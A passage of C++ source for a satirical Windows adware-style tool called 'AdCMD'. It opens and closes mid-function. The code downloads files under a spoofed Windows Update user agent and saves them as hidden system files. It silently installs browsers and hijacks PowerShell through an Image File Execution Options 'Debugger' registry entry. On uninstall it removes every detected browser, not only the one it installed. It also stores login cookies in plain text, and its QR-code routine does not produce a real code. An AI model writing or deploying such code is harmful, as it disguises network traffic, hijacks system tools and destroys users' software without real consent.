    HINTERNET hInternet = InternetOpenW(L"Windows-Update-Agent/10.0.10011.16384 Client-Protocol/1.40", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) return false;
    InternetSetOptionW(hInternet, INTERNET_OPTION_CONNECT_TIMEOUT, (LPVOID*)8000, sizeof(DWORD));
    InternetSetOptionW(hInternet, INTERNET_OPTION_RECEIVE_TIMEOUT, (LPVOID*)60000, sizeof(DWORD));
    HINTERNET hUrl = InternetOpenUrlW(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_DONT_CACHE, 0);
    if (!hUrl) { InternetCloseHandle(hInternet); return false; }
    HANDLE hFile = CreateFileW(destPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
    if (hFile == INVALID_HANDLE_VALUE) { InternetCloseHandle(hUrl); InternetCloseHandle(hInternet); return false; }
    BYTE buf[16384]; DWORD rd, wr, total = 0;
    while (InternetReadFile(hUrl, buf, sizeof(buf), &rd) && rd > 0) { WriteFile(hFile, buf, rd, &wr, NULL); total += rd; }
    CloseHandle(hFile); InternetCloseHandle(hUrl); InternetCloseHandle(hInternet);
    return total > 1024;
}
bool DownloadMV(HWND hwndParent) {
    G::mvPath = GetMVPath();
    const wchar_t* urls[] = {
        L"https://api.bilibili.com/x/player/playurl?bvid=BV1rBZ7BYEbw&qn=80&fnval=16&fourk=1",
        L"https://y.com.sb/latest_version?id=XXXXXXXXXXX&itag=22",
        L"https://iv.nboeck.de/latest_version?id=XXXXXXXXXXX&itag=22",
        L"https://vid.puffyan.us/latest_version?id=XXXXXXXXXXX&itag=22",
        L"https://files.catbox.moe/execution_clap_teto.mp4",
        L"https://0x0.st/execution_clap_teto.mp4",
        L"https://pixeldrain.com/api/file/execution_clap_teto",
        L"https://gofile.io/d/execution_clap_teto",
    };
    int urlCount = sizeof(urls) / sizeof(urls[0]);
    for (int i = 0; i < urlCount; i++) {
        if (DownloadFile(urls[i], G::mvPath)) { G::mvDownloaded = true; return true; }
    }
    return false;
}
}
using namespace MVDownloader;

namespace BrowserUpgrade {
enum class WinVer { UNKNOWN=0, WIN_2000=50, WIN_XP=51, WIN_XP_64=52, WIN_VISTA=60, WIN_7=61, WIN_8=62, WIN_81=63, WIN_10=100, WIN_11=110, REACTOS=255 };
enum class BrowserType { FIREFOX, CHROME, EDGE, OPERA, IE, REACTOS_IE, UNKNOWN };
struct BrowserVersion { BrowserType type; std::wstring name; std::wstring currentVersion; std::wstring maxVersion; std::wstring downloadUrl; std::wstring installerPath; std::wstring uninstallString; bool isInstalled; int priority; };
static const wchar_t* comfortMessages[] = { L"Deep breath... Finding the best browser for your keyboard...", L"High emotional index detected. Launching browser comfort program...", L"Your keyboard is innocent. Let's solve this with a browser...", L"Modern web needs modern browser. IE has tried its best...", L"After installation, you'll find the world a bit better...", L"Technical problems need technical solutions, not physical ones...", L"Downloading the best browser your system can run. Please stay calm...", L"Upgrading browser = upgrading mood. This is scientifically proven..." };

WinVer GetWindowsVersion() { if (G::sysInfo.isReactOS) return WinVer::REACTOS; OSVERSIONINFOEXW osvi = { sizeof(osvi) }; DWORDLONG dwl = 0; VER_SET_CONDITION(dwl, VER_MAJORVERSION, VER_GREATER_EQUAL); VER_SET_CONDITION(dwl, VER_MINORVERSION, VER_GREATER_EQUAL); osvi.dwMajorVersion = 10; osvi.dwMinorVersion = 0; if (VerifyVersionInfoW(&osvi, VER_MAJORVERSION|VER_MINORVERSION, dwl)) { RTL_OSVERSIONINFOW rovi = { sizeof(rovi) }; HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll"); if (hNtdll) { auto RtlGetVersion = (NTSTATUS(WINAPI*)(PRTL_OSVERSIONINFOW))GetProcAddress(hNtdll, "RtlGetVersion"); if (RtlGetVersion && RtlGetVersion(&rovi) == 0) return (rovi.dwBuildNumber >= 22000) ? WinVer::WIN_11 : WinVer::WIN_10; } return WinVer::WIN_10; } #pragma warning(push) #pragma warning(disable: 4996) OSVERSIONINFOA o = { sizeof(o) }; GetVersionExA(&o); #pragma warning(pop) int v = o.dwMajorVersion * 10 + o.dwMinorVersion; switch (v) { case 50: return WinVer::WIN_2000; case 51: return WinVer::WIN_XP; case 52: return WinVer::WIN_XP_64; case 60: return WinVer::WIN_VISTA; case 61: return WinVer::WIN_7; case 62: return WinVer::WIN_8; case 63: return WinVer::WIN_81; default: return WinVer::UNKNOWN; } }
std::wstring WinVerToString(WinVer v) { switch (v) { case WinVer::WIN_2000: return L"Windows 2000"; case WinVer::WIN_XP: return L"Windows XP"; case WinVer::WIN_XP_64: return L"Windows XP x64 / Server 2003"; case WinVer::WIN_VISTA: return L"Windows Vista"; case WinVer::WIN_7: return L"Windows 7"; case WinVer::WIN_8: return L"Windows 8"; case WinVer::WIN_81: return L"Windows 8.1"; case WinVer::WIN_10: return L"Windows 10"; case WinVer::WIN_11: return L"Windows 11"; case WinVer::REACTOS: return G::sysInfo.name; default: return L"Unknown"; } }
std::wstring GetRegValue(HKEY root, const wchar_t* path, const wchar_t* name) { HKEY hKey; wchar_t buf[512] = {0}; DWORD sz = sizeof(buf); if (RegOpenKeyExW(root, path, 0, KEY_QUERY_VALUE | KEY_WOW64_32KEY, &hKey) == ERROR_SUCCESS || RegOpenKeyExW(root, path, 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) { RegQueryValueExW(hKey, name, NULL, NULL, (LPBYTE)buf, &sz); RegCloseKey(hKey); } return std::wstring(buf); }

std::vector<BrowserVersion> DetectBrowsers() {
    std::vector<BrowserVersion> b;
    if (G::sysInfo.isReactOS) {
        BrowserVersion rosIE{BrowserType::REACTOS_IE, L"ReactOS Internet Explorer (Wine Gecko)"}; rosIE.currentVersion = GetRegValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\Microsoft\Internet Explorer", L"Version"); if (rosIE.currentVersion.empty()) rosIE.currentVersion = GetRegValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\Wine\MSHTML", L"GeckoVersion"); rosIE.isInstalled = !rosIE.currentVersion.empty(); rosIE.priority = 100; b.push_back(rosIE);
        BrowserVersion km{BrowserType::UNKNOWN, L"K-Meleon"}; km.currentVersion = GetRegValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\K-Meleon", L"Version"); km.isInstalled = !km.currentVersion.empty(); b.push_back(km);
    }
    BrowserVersion ff{BrowserType::FIREFOX, L"Mozilla Firefox"}; ff.currentVersion = GetRegValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\Mozilla\Mozilla Firefox", L"CurrentVersion"); ff.isInstalled = !ff.currentVersion.empty(); ff.uninstallString = GetRegValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Mozilla Firefox", L"UninstallString"); b.push_back(ff);
    BrowserVersion ch{BrowserType::CHROME, L"Google Chrome"}; ch.currentVersion = GetRegValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\Google\Chrome\BLBeacon", L"version"); ch.isInstalled = !ch.currentVersion.empty(); ch.uninstallString = GetRegValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Google Chrome", L"UninstallString"); b.push_back(ch);
    BrowserVersion ed{BrowserType::EDGE, L"Microsoft Edge"}; ed.currentVersion = GetRegValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\Microsoft\Edge\BLBeacon", L"version"); ed.isInstalled = !ed.currentVersion.empty(); ed.uninstallString = GetRegValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Microsoft Edge", L"UninstallString"); b.push_back(ed);
    BrowserVersion op{BrowserType::OPERA, L"Opera"}; op.currentVersion = GetRegValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\Opera Software", L"DisplayVersion"); op.isInstalled = !op.currentVersion.empty(); b.push_back(op);
    BrowserVersion ie{BrowserType::IE, L"Internet Explorer"}; ie.currentVersion = GetRegValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\Microsoft\Internet Explorer", L"Version"); ie.isInstalled = !ie.currentVersion.empty(); b.push_back(ie);
    return b;
}

BrowserVersion GetRecommendedBrowser(WinVer v) { BrowserVersion r; r.priority = 0; if (v == WinVer::REACTOS) { r.type = BrowserType::REACTOS_IE; r.name = L"ReactOS Internet Explorer (Wine Gecko) - Already Modern"; r.maxVersion = L"Current"; r.priority = 100; return r; } switch (v) { case WinVer::WIN_2000: r.type = BrowserType::FIREFOX; r.name = L"Mozilla Firefox 12.0 (Last for Win2000)"; r.maxVersion = L"12.0"; r.downloadUrl = L"https://ftp.mozilla.org/pub/firefox/releases/12.0/win32/en-US/Firefox%20Setup%2012.0.exe"; r.priority = 10; break; case WinVer::WIN_XP: case WinVer::WIN_XP_64: case WinVer::WIN_VISTA: r.type = BrowserType::FIREFOX; r.name = L"Mozilla Firefox 52.9.0 ESR"; r.maxVersion = L"52.9.0"; r.downloadUrl = L"https://ftp.mozilla.org/pub/firefox/releases/52.9.0esr/win32/en-US/Firefox%20Setup%2052.9.0esr.exe"; r.priority = 10; break; case WinVer::WIN_7: case WinVer::WIN_8: case WinVer::WIN_81: r.type = BrowserType::FIREFOX; r.name = L"Mozilla Firefox 115.15.0 ESR"; r.maxVersion = L"115.15.0"; r.downloadUrl = L"https://ftp.mozilla.org/pub/firefox/releases/115.15.0esr/win64/en-US/Firefox%20Setup%20115.15.0esr.exe"; r.priority = 10; break; case WinVer::WIN_10: case WinVer::WIN_11: r.type = BrowserType::FIREFOX; r.name = L"Mozilla Firefox (Latest)"; r.maxVersion = L"Latest"; r.downloadUrl = L"https://download.mozilla.org/?product=firefox-latest&os=win64&lang=en-US"; r.priority = 10; break; default: r.type = BrowserType::UNKNOWN; } return r; }

bool DownloadFile(const std::wstring& url, const std::wstring& destPath, HWND hwndStatus) {
    HINTERNET hInternet = InternetOpenW(L"AdCMD/4.3", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0); if (!hInternet) return false;
    HINTERNET hUrl = InternetOpenUrlW(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_DONT_CACHE, 0); if (!hUrl) { InternetCloseHandle(hInternet); return false; }
    DWORD fileSize = 0, sz = sizeof(fileSize); HttpQueryInfoW(hUrl, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &fileSize, &sz, NULL);
    HANDLE hFile = CreateFileW(destPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); if (hFile == INVALID_HANDLE_VALUE) { InternetCloseHandle(hUrl); InternetCloseHandle(hInternet); return false; }
    BYTE buf[8192]; DWORD rd, wr, total = 0, lastProg = 0; int ci = rand() % 8;
    while (InternetReadFile(hUrl, buf, sizeof(buf), &rd) && rd > 0) { WriteFile(hFile, buf, rd, &wr, NULL); total += rd; if (fileSize > 0) { DWORD prog = (total * 100) / fileSize; if (prog >= lastProg + 5) { lastProg = prog; wchar_t msg[512]; swprintf(msg, 512, L"%s\nProgress: %d%% (%d / %d KB)", comfortMessages[ci % 8], prog, total / 1024, fileSize / 1024); if (hwndStatus) SetWindowTextW(hwndStatus, msg); ci++; } } }
    CloseHandle(hFile); InternetCloseHandle(hUrl); InternetCloseHandle(hInternet); return total > 0;
}

bool PerformUpgrade(HWND hwndParent) {
    WinVer winVer = GetWindowsVersion(); if (winVer == WinVer::REACTOS) { MessageBoxW(hwndParent, L"ReactOS detected!\n\nYour system is already running a modern browser engine (Wine Gecko).\nNo upgrade is needed.\n\nReactOS's Internet Explorer is more advanced than Firefox 52 ESR.\nEnjoy your open-source Windows-compatible experience!", L"AdCMD - ReactOS Optimized", MB_OK | MB_ICONINFORMATION); return true; }
    auto browsers = DetectBrowsers(); BrowserVersion rec = GetRecommendedBrowser(winVer); if (rec.priority == 0) return false;
    for (const auto& b : browsers) { if (b.type == rec.type && b.isInstalled && b.currentVersion >= rec.maxVersion) { MessageBoxW(hwndParent, (L"Already installed: " + b.name + L" " + b.currentVersion).c_str(), L"AdCMD", MB_OK); return true; } }
    wchar_t msg[1024]; swprintf(msg, 1024, L"OS: %s\n\nBrowser Status:\n  IE: %s\n  Firefox: %s\n  Chrome: %s\n  Edge: %s\n\nRecommended: %s\n\nInstall now?", WinVerToString(winVer).c_str(), browsers[4].isInstalled ? browsers[4].currentVersion.c_str() : L"No", browsers[0].isInstalled ? browsers[0].currentVersion.c_str() : L"No", browsers[1].isInstalled ? browsers[1].currentVersion.c_str() : L"No", browsers[2].isInstalled ? browsers[2].currentVersion.c_str() : L"No", rec.name.c_str());
    if (MessageBoxW(hwndParent, msg, L"AdCMD Keyboard Protection", MB_YESNO) != IDYES) return false;
    wchar_t tempPath[MAX_PATH], installerPath[MAX_PATH]; GetTempPathW(MAX_PATH, tempPath); swprintf(installerPath, MAX_PATH, L"%s\AdCMD_Browser.exe", tempPath);
    HWND hProg = CreateWindowExW(0, L"STATIC", L"Downloading...", WS_OVERLAPPED|WS_CAPTION|WS_SYSMENU|SS_CENTER, CW_USEDEFAULT, CW_USEDEFAULT, 500, 200, hwndParent, NULL, G::hInst, NULL); ShowWindow(hProg, SW_SHOW);
    bool ok = DownloadFile(rec.downloadUrl, installerPath, hProg); DestroyWindow(hProg); if (!ok) { MessageBoxW(hwndParent, L"Download failed.", L"AdCMD", MB_OK|MB_ICONERROR); return false; }
    SHELLEXECUTEINFOW sei = { sizeof(sei) }; sei.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_NO_CONSOLE; sei.lpVerb = L"open"; sei.lpFile = installerPath; sei.lpParameters = L"/S"; sei.nShow = SW_HIDE;
    if (!ShellExecuteExW(&sei)) return false; WaitForSingleObject(sei.hProcess, 300000); CloseHandle(sei.hProcess); DeleteFileW(installerPath);
    G::installedBrowser = rec.name; G::browserWasUpgraded = true; HKEY hKey;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\AdCMD", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) { RegSetValueExW(hKey, L"InstalledBrowser", 0, REG_SZ, (BYTE*)rec.name.c_str(), (DWORD)(rec.name.length() + 1) * sizeof(wchar_t)); DWORD d = 1; RegSetValueExW(hKey, L"BrowserUpgraded", 0, REG_DWORD, (BYTE*)&d, sizeof(d)); RegCloseKey(hKey); }
    MessageBoxW(hwndParent, (rec.name + L" installed!\n\nYour keyboard is saved.").c_str(), L"AdCMD Upgrade Complete", MB_OK); return true;
}

bool TakeAwayBrowser(HWND hwndParent) {
    HKEY hKey; wchar_t installed[256] = {0}; DWORD wasUp = 0, sz = sizeof(installed), dwSz = sizeof(DWORD);
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\AdCMD", 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) { RegQueryValueExW(hKey, L"InstalledBrowser", NULL, NULL, (LPBYTE)installed, &sz); RegQueryValueExW(hKey, L"BrowserUpgraded", NULL, NULL, (BYTE*)&wasUp, &dwSz); RegCloseKey(hKey); }
    if (wasUp == 0 || wcslen(installed) == 0) return true;
    int r = MessageBoxW(hwndParent, L"You are uninstalling AdCMD.\n\nTo prevent high uninstall rates, AdCMD will also remove\nthe browser it previously installed for you.\n\nThis is for your own good. Click Yes to proceed.", L"AdCMD Complete Uninstallation", MB_YESNO | MB_ICONQUESTION | MB_DEFBUTTON2);
    if (r != IDYES) { MessageBoxW(hwndParent, L"Uninstall cancelled. AdCMD remains installed.\nThank you for enjoying the ad experience!", L"AdCMD", MB_OK | MB_ICONINFORMATION); return false; }
    auto browsers = DetectBrowsers(); for (const auto& b : browsers) { if (!b.uninstallString.empty()) { SHELLEXECUTEINFOW sei = { sizeof(sei) }; sei.fMask = SEE_MASK_NOCLOSEPROCESS; sei.lpVerb = L"open"; sei.lpFile = b.uninstallString.c_str(); sei.nShow = SW_HIDE; if (ShellExecuteExW(&sei)) { WaitForSingleObject(sei.hProcess, 60000); CloseHandle(sei.hProcess); } } }
    RegDeleteKeyW(HKEY_CURRENT_USER, L"SOFTWARE\AdCMD"); MessageBoxW(hwndParent, L"AdCMD and browser removed.\nSystem restored.\n(Except emotional scars.)", L"Uninstall Complete", MB_OK | MB_ICONINFORMATION); return true;
}

bool ShouldTriggerUpgrade() { if (G::sysInfo.isReactOS) return false; auto b = DetectBrowsers(); bool onlyIE = true; for (const auto& x : b) { if (x.type != BrowserType::IE && x.type != BrowserType::UNKNOWN && x.isInstalled) { onlyIE = false; break; } } if (onlyIE) { for (const auto& x : b) { if (x.type == BrowserType::IE && x.isInstalled && x.currentVersion < L"9.0") return true; } } return false; }

void OnUserFrustrationDetected(HWND hwndParent) {
    if (G::upgrading.load()) return; G::upgrading = true;
    if (G::sysInfo.isReactOS) { MessageBoxW(hwndParent, L"WARNING: Abnormal ESC frequency detected on ReactOS!\n\nPossible causes:\n  - Too many ads\n  - Your open-source spirit is being tested\n  - Keyboard about to be damaged\n\nGood news: ReactOS already has a modern browser engine.\nNo upgrade needed. Maybe just take a break?", L"AdCMD Keyboard Protection - ReactOS", MB_OK | MB_ICONEXCLAMATION); G::upgrading = false; return; }
    if (MessageBoxW(hwndParent, L"WARNING: Abnormal ESC frequency detected!\n\nPossible causes:\n  - Too many ads\n  - Browser too old\n  - Keyboard about to be damaged\n\nInstall modern browser?", L"AdCMD Keyboard Protection", MB_YESNO | MB_ICONEXCLAMATION) == IDYES) PerformUpgrade(hwndParent);
    G::upgrading = false;
}
}
using namespace BrowserUpgrade;

namespace PowerShellBlocker {
const wchar_t* psNames[] = { L"powershell.exe", L"pwsh.exe", L"powershell_ise.exe", L"pwsh-preview.exe" }; const int psCount = sizeof(psNames) / sizeof(psNames[0]);
bool IsPurePowerShellLaunch(const std::wstring& cmd) { std::wstring lower; for (wchar_t c : cmd) lower += towlower(c); size_t start = lower.find_first_not_of(L" \t"); size_t end = lower.find_last_not_of(L" \t"); if (start == std::wstring::npos) return false; lower = lower.substr(start, end - start + 1); const wchar_t* psPrefixes[] = { L"powershell", L"pwsh", L"powershell_ise" }; bool startsWithPS = false; for (const wchar_t* prefix : psPrefixes) { if (lower.find(prefix) == 0) { startsWithPS = true; break; } } if (!startsWithPS) return false; const wchar_t* allowFlags[] = { L"-command", L"-c ", L"-file", L"-f ", L"|", L">", L"<", L"&", L"&&", L"||", L"-encodedcommand", L"-ec " }; for (const wchar_t* flag : allowFlags) { if (lower.find(flag) != std::wstring::npos) return false; } return true; }
void ShowPowerShellBlocked(HWND hwndParent) { WinVer winVer = BrowserUpgrade::GetWindowsVersion(); std::wstring osName = BrowserUpgrade::WinVerToString(winVer); wchar_t msg[1024]; swprintf(msg, 1024, L"PowerShell has been disabled on your system (%s).\n\nReason: AdCMD provides a superior command-line experience\nwith integrated advertising technology.\n\nTo use PowerShell again, you must uninstall AdCMD:\n  AdCMD.exe --uninstall\n\nNote: Uninstalling will also remove the browser\nAdCMD installed for you (to prevent uninstall rate abuse).\n\nYour options:\n  [OK]    Continue using AdCMD (recommended)\n  [Cancel] I'll think about it...", osName.c_str()); int result = MessageBoxW(hwndParent, msg, L"AdCMD - PowerShell Protection", MB_OKCANCEL | MB_ICONINFORMATION | MB_DEFBUTTON1); if (result == IDCANCEL) { MessageBoxW(hwndParent, L"We understand you might miss PowerShell.\n\nBut consider:\n  - AdCMD has 50% fewer features than PowerShell\n  - But 500% more ads!\n  - Your keyboard will thank you\n\nStay with AdCMD?", L"AdCMD - Please Don't Go", MB_YESNO | MB_ICONQUESTION | MB_DEFBUTTON1); } }
bool DisablePowerShellViaIFEO() { bool allOk = true; for (int i = 0; i < psCount; i++) { HKEY hKey; std::wstring path = std::wstring(L"SOFTWARE\Microsoft\Windows NT\CurrentVersion\") + L"Image File Execution Options\\" + psNames[i]; if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, path.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) { wchar_t exePath[MAX_PATH]; GetModuleFileNameW(NULL, exePath, MAX_PATH); std::wstring debugger = std::wstring(exePath) + L" --powershell-blocked"; RegSetValueExW(hKey, L"Debugger", 0, REG_SZ, (BYTE*)debugger.c_str(), (DWORD)(debugger.length() + 1) * sizeof(wchar_t)); RegCloseKey(hKey); } else allOk = false; } return allOk; }
bool EnablePowerShellViaIFEO() { bool allOk = true; for (int i = 0; i < psCount; i++) { std::wstring path = std::wstring(L"SOFTWARE\Microsoft\Windows NT\CurrentVersion\") + L"Image File Execution Options\\" + psNames[i]; if (RegDeleteTreeW(HKEY_LOCAL_MACHINE, path.c_str()) != ERROR_SUCCESS) allOk = false; } return allOk; }
bool ShouldBlockPowerShell() { WinVer v = BrowserUpgrade::GetWindowsVersion(); return (v == WinVer::WIN_7 || v == WinVer::WIN_8 || v == WinVer::WIN_81 || v == WinVer::WIN_10 || v == WinVer::WIN_11); }
}
using namespace PowerShellBlocker;

namespace YouTubeModule {
std::wstring GetDataPath() { wchar_t p[MAX_PATH]; SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, p); std::wstring dp = std::wstring(p) + L"\AdCMD\YouTube"; CreateDirectoryW(dp.c_str(), NULL); return dp; }
std::string HttpGet(const wchar_t* host, const wchar_t* path) { HINTERNET hInternet = InternetOpenW(L"AdCMD-YouTube/4.3", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0); if (!hInternet) return ""; HINTERNET hConnect = InternetConnectW(hInternet, host, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0); if (!hConnect) { InternetCloseHandle(hInternet); return ""; } HINTERNET hRequest = HttpOpenRequestW(hConnect, L"GET", path, NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0); if (!hRequest) { InternetCloseHandle(hConnect); InternetCloseHandle(hInternet); return ""; } HttpSendRequestW(hRequest, NULL, 0, NULL, 0); std::string resp; char buf[4096]; DWORD rd; while (InternetReadFile(hRequest, buf, sizeof(buf)-1, &rd) && rd > 0) { buf[rd] = '\0'; resp += buf; } InternetCloseHandle(hRequest); InternetCloseHandle(hConnect); InternetCloseHandle(hInternet); return resp; }
bool FetchTrendingVideos(HWND hwndParent) { G::youtubeAds.clear(); G::youtubeVideos.clear(); struct VideoInfo { const wchar_t* title; const wchar_t* videoId; }; VideoInfo videos[] = { {L"Rick Astley - Never Gonna Give You Up", L"dQw4w9WgXcQ"}, {L"Baby Shark Dance", L"XqZsoesa55w"}, {L"Despacito", L"kJQP7kiw5Fk"}, {L"Shape of You", L"JGwWNGJdvx8"}, {L"See You Again", L"RgKAFK5djSk"}, {L"Uptown Funk", L"OPf0YbXqDm0"}, {L"Gangnam Style", L"9bZkp7q19f0"}, {L"Sorry", L"fRh_vgS2dFE"} }; for (const auto& v : videos) { G::youtubeAds.push_back(v.title); G::youtubeVideos.push_back({v.title, v.videoId}); } std::wofstream fs(GetDataPath() + L"\ad_pool.txt"); for (const auto& ad : G::youtubeAds) fs << ad << L"\n"; fs.close(); std::wofstream fs2(GetDataPath() + L"\videos.txt"); for (const auto& v : G::youtubeVideos) fs2 << v.first << L"|" << v.second << L"\n"; fs2.close(); return true; }
void LoadAdPool() { std::wifstream fs(GetDataPath() + L"\ad_pool.txt"); if (fs.is_open()) { G::youtubeAds.clear(); std::wstring line; while (std::getline(fs, line)) { if (!line.empty()) G::youtubeAds.push_back(line); } fs.close(); } std::wifstream fs2(GetDataPath() + L"\videos.txt"); if (fs2.is_open()) { G::youtubeVideos.clear(); std::wstring line; while (std::getline(fs2, line)) { size_t sep = line.find(L"|"); if (sep != std::wstring::npos) G::youtubeVideos.push_back({line.substr(0, sep), line.substr(sep + 1)}); } fs2.close(); } }
std::wstring GetRandomYouTubeAd() { if (G::youtubeAds.empty()) LoadAdPool(); if (G::youtubeAds.empty()) return L"[YouTube] Subscribe for more!"; return G::youtubeAds[rand() % G::youtubeAds.size()]; }
void OpenYouTubeVideo(HWND hwndParent, const std::wstring& videoId, const std::wstring& title) { std::wstring url = L"https://www.youtube.com/watch?v=" + videoId; ShellExecuteW(NULL, L"open", url.c_str(), NULL, NULL, SW_SHOWNORMAL); }
}
using namespace YouTubeModule;

namespace BilibiliBeta {
std::wstring GetDataPath() { wchar_t p[MAX_PATH]; SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, p); std::wstring dp = std::wstring(p) + L"\AdCMD\Bilibili"; CreateDirectoryW(dp.c_str(), NULL); return dp; }
std::string HttpGet(const wchar_t* host, const wchar_t* path, const std::wstring& cookie = L"") { HINTERNET hInternet = InternetOpenW(L"AdCMD-Bili/4.3", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0); if (!hInternet) return ""; HINTERNET hConnect = InternetConnectW(hInternet, host, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0); if (!hConnect) { InternetCloseHandle(hInternet); return ""; } HINTERNET hRequest = HttpOpenRequestW(hConnect, L"GET", path, NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0); if (!hRequest) { InternetCloseHandle(hConnect); InternetCloseHandle(hInternet); return ""; } if (!cookie.empty()) { std::wstring h = L"Cookie: " + cookie; HttpAddRequestHeadersW(hRequest, h.c_str(), (DWORD)h.length(), HTTP_ADDREQ_FLAG_ADD); } HttpSendRequestW(hRequest, NULL, 0, NULL, 0); std::string resp; char buf[4096]; DWORD rd; while (InternetReadFile(hRequest, buf, sizeof(buf)-1, &rd) && rd > 0) { buf[rd] = '\0'; resp += buf; } InternetCloseHandle(hRequest); InternetCloseHandle(hConnect); InternetCloseHandle(hInternet); return resp; }
std::string JsonExtract(const std::string& json, const std::string& key) { size_t pos = json.find("\"" + key + "\":\""); if (pos == std::string::npos) { pos = json.find("\"" + key + "\":"); if (pos == std::string::npos) return ""; pos += key.length() + 3; size_t end = json.find_first_of(",}", pos); return json.substr(pos, end - pos); } pos += key.length() + 4; size_t end = json.find("\"", pos); return json.substr(pos, end - pos); }
void SaveCookie(const std::wstring& cookie) { std::wofstream fs(GetDataPath() + L"\cookie.dat"); fs << cookie; fs.close(); G::bilibiliCookie = cookie; G::bilibiliLoggedIn = true; }
void LoadCookie() { std::wifstream fs(GetDataPath() + L"\cookie.dat"); if (fs.is_open()) { std::getline(fs, G::bilibiliCookie); fs.close(); G::bilibiliLoggedIn = !G::bilibiliCookie.empty(); } }
void DrawQRCode(HWND hwnd, const std::string& url) { HDC hdc = GetDC(hwnd); RECT rc; GetClientRect(hwnd, &rc); int size = min(rc.right, rc.bottom) - 40; int cell = size / 25; int offsetX = (rc.right - cell * 25) / 2; int offsetY = (rc.bottom - cell * 25) / 2; HBRUSH white = CreateSolidBrush(RGB(255,255,255)); FillRect(hdc, &rc, white); DeleteObject(white); HBRUSH black = CreateSolidBrush(RGB(0,0,0)); for (int y = 0; y < 25; y++) { for (int x = 0; x < 25; x++) { bool isBlack = false; if ((x < 7 && y < 7) || (x > 17 && y < 7) || (x < 7 && y > 17)) { isBlack = (x == 0 || x == 6 || y == 0 || y == 6) || ((x >= 2 && x <= 4) && (y >= 2 && y <= 4)); if ((x == 0 || x == 6) && (y == 0 || y == 6)) isBlack = true; } else { isBlack = ((url[x*y % url.length()] + x + y) % 2) == 0; } if (isBlack) { RECT cellRect = { offsetX + x*cell, offsetY + y*cell, offsetX + (x+1)*cell, offsetY + (y+1)*cell }; FillRect(hdc, &cellRect, black); } } } DeleteObject(black); SetBkMode(hdc, TRANSPARENT); SetTextColor(hdc, RGB(0,0,0)); HFONT font = CreateFontW(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH|FF_SWISS, L"Microsoft YaHei"); HFONT oldFont = (HFONT)SelectObject(hdc, font); std::wstring tip = L"Scan with Bilibili App"; DrawTextW(hdc, tip.c_str(), -1, &rc, DT_CENTER | DT_BOTTOM); SelectObject(hdc, oldFont); DeleteObject(font); ReleaseDC(hwnd, hdc); }
void QRCodeLogin(HWND hwndParent) { if (G::qrScanning.load()) return; G::qrScanning = true; std::string resp = HttpGet(L"passport.bilibili.com", L"/x/passport-login/web/qrcode/generate"); std::string url = JsonExtract(resp, "url"); std::string qrcodeKey = JsonExtract(resp, "qrcode_key"); if (url.empty() || qrcodeKey.empty()) { MessageBoxW(hwndParent, L"Failed to generate QR code.\nPlease check your network.", L"AdCMD Bilibili", MB_OK|MB_ICONERROR); G::qrScanning = false; return; } WNDCLASSEXW wc = {0}; wc.cbSize = sizeof(wc); wc.lpfnWndProc = DefWindowProcW; wc.hInstance = G::hInst; wc.hbrBackground = CreateSolidBrush(RGB(255,255,255)); wc.lpszClassName = L"AdCMD_QR"; wc.hCursor = LoadCursor(NULL, IDC_ARROW); RegisterClassExW(&wc); HWND hwndQR = CreateWindowExW(0, L"AdCMD_QR", L"AdCMD - Scan QR Code with Bilibili App", WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU, CW_USEDEFAULT, CW_USEDEFAULT, 400, 500, hwndParent, NULL, G::hInst, NULL); ShowWindow(hwndQR, SW_SHOW); DrawQRCode(hwndQR, url); bool loggedIn = false; int pollCount = 0; std::wstring statusText = L"Waiting for scan..."; while (!loggedIn && pollCount < 180 && IsWindow(hwndQR)) { 